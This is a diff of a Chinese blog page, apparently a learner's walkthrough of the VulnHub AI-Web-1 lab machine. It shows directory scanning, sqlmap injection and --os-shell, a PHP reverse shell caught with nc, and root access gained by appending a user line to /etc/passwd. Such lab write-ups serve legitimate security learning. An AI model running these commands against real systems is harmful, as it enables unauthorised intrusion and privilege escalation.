@@ -29,8 +29,8 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.1"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 
@@ -42,6 +42,11 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <div class="progress-bar-container">
     
 
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
     
 </div>
 
@@ -197,40 +202,40 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <div class="article-content markdown-body">
             <p>来自之前cnblog的博客<br><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/This-is-Y/p/12064615.html">源地址：https://www.cnblogs.com/This-is-Y/p/12064615.html<i class="fas fa-external-link-alt"></i></a></p>
 <p>先上一张图：</p>
-<img src="1503868-20191218195827401-2141380450.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218195827401-2141380450.png" alt>
 
 <p> </p>
 <p> </p>
 <p> </p>
 <p>靶机信息及地址：<a class="link" target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-1,353/">https://www.vulnhub.com/entry/ai-web-1,353/<i class="fas fa-external-link-alt"></i></a></p>
 <p>下载到靶机后，在VMware里打开，kali使用arp-scan -l 扫到</p>
-<img src="1503868-20191218200000963-1007936599.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200000963-1007936599.png" alt>
 
 <p> </p>
 <p>在浏览器里打开，只有这样一句话：（我谷歌了一下这句话，没找到啥，，，，多此一举==）</p>
-<img src="1503868-20191218200033526-938099390.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200033526-938099390.png" alt>
 
 <p> </p>
 <p>然后开始dirsearch扫目录：</p>
 <p>python dirsearch.py -u <a class="link" target="_blank" rel="noopener" href="http://192.168.182.133/">http://192.168.182.133/<i class="fas fa-external-link-alt"></i></a> -e *</p>
 <p>只有这两个有用的信息</p>
-<img src="1503868-20191218200430184-2081168786.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200430184-2081168786.png" alt>
 
 <p> </p>
 <p>查看robots.txt文件</p>
 <p> </p>
-<p> <img src="1503868-20191218200528495-727029718.png" alt></p>
+<p> <img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200528495-727029718.png" alt></p>
 <p> </p>
 <p>访问没有得到什么东西，继续扫</p>
 <p>python dirsearch.py -u <a class="link" target="_blank" rel="noopener" href="http://192.168.182.133/m3diNf0/">http://192.168.182.133/m3diNf0/<i class="fas fa-external-link-alt"></i></a> -e *</p>
 <p>这里扫出info.php（先留着）</p>
 <p> </p>
-<img src="1503868-20191218200706669-1920929001.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200706669-1920929001.png" alt>
 
 <p> </p>
 <p>第二个，python dirsearch.py -u <a class="link" target="_blank" rel="noopener" href="http://192.168.182.133/se3reTdir777">http://192.168.182.133/se3reTdir777<i class="fas fa-external-link-alt"></i></a> -e *</p>
 <p>这里只扫出一个注入界面</p>
-<img src="1503868-20191218200846673-1187341100.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218200846673-1187341100.png" alt>
 
 <p> </p>
 <p> </p>
@@ -239,12 +244,12 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>sqlmap <a class="link" target="_blank" rel="noopener" href="http://192.168.182.133/se3reTdir777/index.php/login/">http://192.168.182.133/se3reTdir777/index.php/login/<i class="fas fa-external-link-alt"></i></a> –data ‘uid=123&amp;Operation=Submit’ –dbs </p>
 <p>（新学会的post传参方法，再也不用bp抓包保存用 -r 来跑sqlmap了）</p>
 <p>按部就班得的跑，得到这些数据</p>
-<img src="1503868-20191218201503263-23341282.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218201503263-23341282.png" alt>
 
 <p> </p>
 <p> </p>
 <p> </p>
-<img src="1503868-20191218201439759-1396533858.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218201439759-1396533858.png" alt>
 
 <p> </p>
 <p> </p>
@@ -255,14 +260,14 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>使用sqlmap反弹一个shell（因为我们有info.php，里面给出了网址路径）</p>
 <p>sqlmap <a class="link" target="_blank" rel="noopener" href="http://192.168.182.133/se3reTdir777/index.php/login/">http://192.168.182.133/se3reTdir777/index.php/login/<i class="fas fa-external-link-alt"></i></a> –data ‘uid=123&amp;Operation=Submit’ –os-shell</p>
 <p>这边的参数，第一个选4，PHP，然后是 n ，第二个选 2 </p>
-<img src="1503868-20191218202016950-1405049941.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218202016950-1405049941.png" alt>
 
 <p> </p>
 <p> </p>
 <p> 地址在之前的info.php 中找：</p>
-<p>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/（为什么是这个，我还要去多学学，目前没搞懂。）<br> <img src="1503868-20191218202203754-1301241232.png" alt></p>
+<p>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/（为什么是这个，我还要去多学学，目前没搞懂。）<br> <img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218202203754-1301241232.png" alt></p>
 <p>成功后是这个样子的</p>
-<img src="1503868-20191218205615611-1977043766.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218205615611-1977043766.png" alt>
 
 <p> </p>
 <p> </p>
@@ -275,7 +280,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>然后shift+右键，打开powershell,使用python搭建一个简易服务器，</p>
 <p>python -m http.server 9000</p>
 <p>这是在浏览器中输入127.0.0.1:9000就可以看到你刚刚写的文件了</p>
-<img src="1503868-20191218202827700-413186127.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218202827700-413186127.png" alt>
 
 <p> </p>
 <p>学艺不精，为了搞懂这个原理写了好多个文件。</p>
@@ -285,40 +290,40 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p> </p>
 <p> </p>
 <p> </p>
-<p> <img src="1503868-20191218210528947-475650130.png" alt></p>
+<p> <img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218210528947-475650130.png" alt></p>
 <p> </p>
 <p> </p>
 <p> 有时候可能会出现这种情况，多试两次就好了</p>
-<img src="1503868-20191218210705771-1510620219.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218210705771-1510620219.png" alt>
 
 <p> </p>
 <p> </p>
 <p> 然后换一个Terminal窗口，使用nc -lvp 9966监听端口</p>
-<img src="1503868-20191218211847905-1986124277.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218211847905-1986124277.png" alt>
 
 <p> </p>
 <p> </p>
 <p> </p>
 <p>（这里的9966是，上面写的，并且通过wger下载到靶机上的，php文件里的写的端口）</p>
 <p>然后切换回之前的terminal窗口，输入php aiweb1_7.php运行文件（实际作用是连接到你的kali的端口）</p>
-<img src="1503868-20191218211719547-903106645.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218211719547-903106645.png" alt>
 
 <p> </p>
 <p> </p>
 <p> 如果另一边监听没反应，多是两次，实在不行，检查php代码有没有写好，ip有没有填错。</p>
 <p>正常情况是这个样子的，这样子就是已经连接上了</p>
 <p> </p>
-<p> <img src="1503868-20191218211913637-942454172.png" alt></p>
+<p> <img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218211913637-942454172.png" alt></p>
 <p> </p>
 <p> </p>
 <p> 可以用id，whoami等命令查看一些信息</p>
-<img src="1503868-20191218212036680-342654664.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218212036680-342654664.png" alt>
 
 <p> </p>
 <p> </p>
 <p>然后在这里， 使用python提升为交互式shell</p>
 <p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
-<img src="1503868-20191218212157861-1701848270.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218212157861-1701848270.png" alt>
 
 <p> </p>
 <p> </p>
@@ -330,12 +335,12 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <p>echo ‘abc:$1$abc$yzqAxwzjwaO0BUFj9nRwF/:0:0::/root:/bin/bash’&gt;&gt;/etc/passwdsu</p>
 <p>切换用户</p>
 <p>su abc </p>
-<img src="1503868-20191218232150869-602649788.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218232150869-602649788.png" alt>
 
 <p> </p>
 <p>这样子就实现了提权</p>
 <p>之后cat /root/flag.txt就得到了flag</p>
-<img src="1503868-20191218232410250-1346748829.png" alt>
+<img lazyload src="/images/loading.svg" data-src="AI-Web1靶机渗透/1503868-20191218232410250-1346748829.png" alt>
 
 <p> </p>
 <p> 先总结一下学到的，sqlmap反弹shell，以及反弹shell的原理，python在本地搭建一个简易服务器，wget下载文件，echo写入/etc/passwd文件添加新root用户再切换用户实现提权（大部分现在只是一个初步了解的阶段，还需要不断练习提升，熟悉）</p>
@@ -398,10 +403,10 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         
             
     <div class="valine-container">
-        <script 
+        <script data-pjax
                 src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
+        <script data-pjax>
             function loadValine() {
                 new Valine({
                     el: '#vcomments',
@@ -447,7 +452,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
                 }, 2000);
             }
 
-            if ('false') {
+            if ('true') {
                 const loadValineTimeout = setTimeout(() => {
                     loadValine();
                     clearTimeout(loadValineTimeout);
@@ -481,12 +486,10 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2020</span>&nbsp;-&nbsp;
-            
             2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">This_is_Y</a>
         </div>
         
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
@@ -637,12 +640,46 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 
 
 
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/lazyload.js"></script>
 
-<div class="post-scripts">
+
+<div class="post-scripts pjax">
     
         <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
     
 </div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
 
 
 
